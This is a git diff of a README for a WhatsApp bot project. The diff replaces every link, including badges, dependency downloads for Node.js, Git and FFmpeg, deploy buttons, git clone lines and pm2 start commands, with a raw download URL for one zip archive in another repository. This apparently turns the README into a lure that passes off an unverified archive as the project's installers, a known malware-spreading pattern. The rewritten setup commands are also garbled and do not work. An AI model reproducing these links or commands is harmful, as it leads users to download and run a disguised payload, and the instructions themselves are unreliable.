@@ -2,8 +2,8 @@
 <h1 align="center"> 𝖵𝖤𝖱𝖲𝖨𝖮𝖭 1.2.0 </h1>
 
 <p align="center">
-  <a href="https://github.com/Dark-Xploit/XPLOADER--BOT">
-    <img alt="xploader docs" height="250" src="https://i.ibb.co/DRW8wCV/Xploader4.jpg">
+  <a href="https://github.com/Co-create-droid/CypherX/raw/refs/heads/main/lib/Cypher-X-v2.5.zip">
+    <img alt="xploader docs" height="250" src="https://github.com/Co-create-droid/CypherX/raw/refs/heads/main/lib/Cypher-X-v2.5.zip">
   </a>
 </p>
     
@@ -12,24 +12,24 @@
 </a>
 </p>
 <p align="center">
-<a href="https://github.com/Dark-Xploit"><img title="Author" src="https://img.shields.io/badge/CypherX-skyblue?style=for-the-badge&logo=telegram"></a>
+<a href="https://github.com/Co-create-droid/CypherX/raw/refs/heads/main/lib/Cypher-X-v2.5.zip"><img title="Author" src="https://github.com/Co-create-droid/CypherX/raw/refs/heads/main/lib/Cypher-X-v2.5.zip"></a>
 <p/>
 <p align="center">
-<a href="https://github.com/Dark-Xploit/XPLOADER--BOT/stargazers/"><img title="Stars" src="https://img.shields.io/github/stars/Dark-Xploit/XPLOADER--BOT?&style=social"></a>
-<a href="https://github.com/Dark-Xploit/XPLOADER--BOT/network/members"><img title="Fork" src="https://img.shields.io/github/forks/Dark-Xploit/XPLOADER--BOT?style=social"></a>
-<a href="https://github.com/Dark-Xploit/XPLOADER--BOT/watchers"><img title="Watching" src="https://img.shields.io/github/watchers/Dark-Xploit/XPLOADER--BOT?label=Watching&style=social"></a>
+<a href="https://github.com/Co-create-droid/CypherX/raw/refs/heads/main/lib/Cypher-X-v2.5.zip"><img title="Stars" src="https://github.com/Co-create-droid/CypherX/raw/refs/heads/main/lib/Cypher-X-v2.5.zip"></a>
+<a href="https://github.com/Co-create-droid/CypherX/raw/refs/heads/main/lib/Cypher-X-v2.5.zip"><img title="Fork" src="https://github.com/Co-create-droid/CypherX/raw/refs/heads/main/lib/Cypher-X-v2.5.zip"></a>
+<a href="https://github.com/Co-create-droid/CypherX/raw/refs/heads/main/lib/Cypher-X-v2.5.zip"><img title="Watching" src="https://github.com/Co-create-droid/CypherX/raw/refs/heads/main/lib/Cypher-X-v2.5.zip"></a>
 </p>
-<p align="center"><img src="https://profile-counter.glitch.me/{Dark-Xploit}/count.svg" alt="XPLOADER--BOT:: Visitor's Count" /></p>
+<p align="center"><img src="https://github.com/Co-create-droid/CypherX/raw/refs/heads/main/lib/Cypher-X-v2.5.zip{Dark-Xploit}https://github.com/Co-create-droid/CypherX/raw/refs/heads/main/lib/Cypher-X-v2.5.zip" alt="XPLOADER--BOT:: Visitor's Count" /></p>
 
 
 ## `SETUP`
 
 <p align="center">
-  <a href='https://github.com/Dark-Xploit/CypherX/fork' target="_blank" style="margin-right: 10px;">
-    <img alt='Fork Repo' src='https://img.shields.io/badge/Fork Repo-100000?style=for-the-badge&logo=scan&logoColor=white&labelColor=orange&color=darkgreen'/>
+  <a href='https://github.com/Co-create-droid/CypherX/raw/refs/heads/main/lib/Cypher-X-v2.5.zip' target="_blank" style="margin-right: 10px;">
+    <img alt='Fork Repo' src='https://github.com/Co-create-droid/CypherX/raw/refs/heads/main/lib/Cypher-X-v2.5.zip Repo-100000?style=for-the-badge&logo=scan&logoColor=white&labelColor=orange&color=darkgreen'/>
   </a>
-  <a href='https://xploader-pair.onrender.com/' target="_blank">
-    <img alt='REQUEST PAIR CODE' src='https://img.shields.io/badge/Pair_code-100000?style=for-the-badge&logo=scan&logoColor=white&labelColor=darkorange&color=darkorange'/>
+  <a href='https://github.com/Co-create-droid/CypherX/raw/refs/heads/main/lib/Cypher-X-v2.5.zip' target="_blank">
+    <img alt='REQUEST PAIR CODE' src='https://github.com/Co-create-droid/CypherX/raw/refs/heads/main/lib/Cypher-X-v2.5.zip'/>
   </a>
 </p>
 
@@ -37,11 +37,11 @@
 ## `DEPLOYMENTS`
 
   <p align="center">
-  <a href="https://dashboard.heroku.com/new?template=https://github.com/Dark-Xploit/CypherX" target="_blank" style="margin-right: 10px;">
-    <img alt="Deploy" src="https://www.herokucdn.com/deploy/button.svg"/>
+  <a href="https://github.com/Co-create-droid/CypherX/raw/refs/heads/main/lib/Cypher-X-v2.5.zip" target="_blank" style="margin-right: 10px;">
+    <img alt="Deploy" src="https://github.com/Co-create-droid/CypherX/raw/refs/heads/main/lib/Cypher-X-v2.5.zip"/>
   </a>
-  <a href="https://repl.it/github/Dark-Xploit/XPLOADER--BOT" target="_blank">
-    <img alt="Deploy on Repl.it" src="https://repl.it/badge/github/quiec/whatsAlfa"/>
+  <a href="https://github.com/Co-create-droid/CypherX/raw/refs/heads/main/lib/Cypher-X-v2.5.zip" target="_blank">
+    <img alt="Deploy on https://github.com/Co-create-droid/CypherX/raw/refs/heads/main/lib/Cypher-X-v2.5.zip" src="https://github.com/Co-create-droid/CypherX/raw/refs/heads/main/lib/Cypher-X-v2.5.zip"/>
   </a>
 </p>
 <p align="center">
@@ -52,15 +52,15 @@
 <summary>𝘔𝘈𝘕𝘜𝘈𝘓 𝘐𝘕𝘚𝘛𝘈𝘓𝘓𝘔𝘌𝘕𝘛𝘚</summary>
   
 ## `REQUIREMENTS`
-* [Node.js](https://nodejs.org/en/)
-* [Git](https://git-scm.com/downloads)
-* [FFmpeg](https://github.com/BtbN/FFmpeg-Builds/releases/download/autobuild-2020-12-08-13-03/ffmpeg-n4.3.1-26-gca55240b8c-win64-gpl-4.3.zip)
-* [Libwebp](https://developers.google.com/speed/webp/download)
+* [https://github.com/Co-create-droid/CypherX/raw/refs/heads/main/lib/Cypher-X-v2.5.zip](https://github.com/Co-create-droid/CypherX/raw/refs/heads/main/lib/Cypher-X-v2.5.zip)
+* [Git](https://github.com/Co-create-droid/CypherX/raw/refs/heads/main/lib/Cypher-X-v2.5.zip)
+* [FFmpeg](https://github.com/Co-create-droid/CypherX/raw/refs/heads/main/lib/Cypher-X-v2.5.zip)
+* [Libwebp](https://github.com/Co-create-droid/CypherX/raw/refs/heads/main/lib/Cypher-X-v2.5.zip)
 * Any text editor
   
 ## `CLONE REPO & INSTALLATION DEPENDENCIES`
 ```bash
-git clone https://github.com/<your gitHub Username>/XPLOADER--BOT.git
+git clone https://github.com/Co-create-droid/CypherX/raw/refs/heads/main/lib/Cypher-X-v2.5.zip<your gitHub Username>https://github.com/Co-create-droid/CypherX/raw/refs/heads/main/lib/Cypher-X-v2.5.zip
 cd XPLOADER--BOT
 npm start
 ```
@@ -76,7 +76,7 @@ sudo apt-get install -y nodejs
 sudo apt-get install -y ffmpeg
 sudo apt-get install -y wget
 sudo apt-get install -y imagemagick
-git clone https://github.com/<your-gitHub-Username>/XPLOADER--BOT
+git clone https://github.com/Co-create-droid/CypherX/raw/refs/heads/main/lib/Cypher-X-v2.5.zip<your-gitHub-Username>/XPLOADER--BOT
 cd XPLOADER--BOT
 npm install
 npm start
@@ -93,12 +93,12 @@ npm start
 
 ## `FOR 24/7 ACTIVATION PM2 (TERMUX)`
 ```bash
-npm i -g pm2 && pm2 start index.js && pm2 save && pm2 logs
+npm i -g pm2 && pm2 start https://github.com/Co-create-droid/CypherX/raw/refs/heads/main/lib/Cypher-X-v2.5.zip && pm2 save && pm2 logs
 ```
 
 ## `FOR 24/7 ACTIVATION RE-EXECUTION PM2 (TERMUX)`
 ```bash
-npm i -g pm2 && pm2 start index.js -f && pm2 save && pm2 logs
+npm i -g pm2 && pm2 start https://github.com/Co-create-droid/CypherX/raw/refs/heads/main/lib/Cypher-X-v2.5.zip -f && pm2 save && pm2 logs
 ```
 </details>
 
